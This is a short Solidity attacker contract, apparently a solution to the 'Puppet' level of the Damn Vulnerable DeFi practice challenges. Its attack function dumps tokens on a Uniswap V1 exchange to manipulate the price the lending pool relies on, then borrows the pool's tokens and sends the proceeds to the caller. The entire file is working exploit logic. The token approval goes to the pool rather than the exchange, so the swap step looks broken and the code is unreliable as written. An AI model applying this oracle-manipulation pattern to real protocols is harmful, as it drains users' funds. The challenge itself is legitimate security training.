// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import {IUniswapV1Exchange} from "../../src/puppet/IUniswapV1Exchange.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {PuppetPool} from "../../src/puppet/PuppetPool.sol";
import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";

contract PuppetAttacker {
    constructor(){

    }

    function attack(IUniswapV1Exchange uniswapV1Exchange, DamnValuableToken token, PuppetPool pool, address recovery, uint256 borrowAmount) external{
        uint256 tokenAmount = token.balanceOf(address(this));
        token.approve(address(pool),tokenAmount );
        uniswapV1Exchange.tokenToEthSwapInput(tokenAmount, 0, block.timestamp);

        pool.borrow(borrowAmount, recovery);
        SafeTransferLib.safeTransferETH(msg.sender, address (this).balance);
    }
    receive() external payable{}
}
